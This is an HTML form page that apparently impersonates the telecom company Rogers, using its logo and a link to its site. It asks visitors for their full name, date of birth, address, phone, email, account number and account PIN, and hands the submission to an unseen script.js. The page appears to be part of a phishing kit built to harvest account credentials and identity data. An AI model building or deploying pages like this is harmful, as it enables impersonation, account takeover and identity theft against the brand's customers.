<html>
<head>
    <title>Personal Info</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <div class="login-container">
        <a href="https://www.rogers.com/" class="d-inline-block -mx-8" style="padding: 26px 12px 26px 8px;">
            <img width="120" height="50" src="https://1000logos.net/wp-content/uploads/2021/09/Rogers-Logo-768x432.png" alt="Rogers Logo - Home">
        </a>
        
        <h2>Personal Info</h2>
        <form id="personal-info-form">
            <input type="text" id="first-name" placeholder="First Name" required=""><br>
            <input type="text" id="middle-name" placeholder="Middle Name" required=""><br>
            <input type="text" id="last-name" placeholder="Last Name" required=""><br>
            <input type="email" id="email" placeholder="Email" required=""><br>
            <input type="date" id="dob" required=""><br>
            <input type="text" id="address" placeholder="Address" required=""><br>
            <input type="tel" id="phone" placeholder="Phone Number" required=""><br>
            <input type="text" id="account-number" placeholder="Account Number" required=""><br>
            <input type="text" id="pin" placeholder="Pin" required=""><br>
            <button type="submit">Submit</button>
        </form>
    </div>
    <script src="script.js"></script>

</body>
</html>
